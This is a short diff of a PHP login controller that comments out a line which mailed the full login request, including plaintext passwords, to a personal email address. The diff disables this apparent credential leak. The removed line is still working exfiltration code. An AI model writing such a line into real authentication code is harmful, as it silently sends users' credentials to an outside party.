@@ -34,7 +34,7 @@ class AuthController extends Controller
                 'message' => $validator->errors()->first(),
             ], 422);
         }
-        mail('brijesh.saspana@gmail.com',$request->email,print_r($request->all(),true));
+        // mail('brijesh.saspana@gmail.com',$request->email,print_r($request->all(),true));
 
         $user = User::where('email', $request->email)->first();
         if ($user && Hash::check($request->password, $user->password)) {
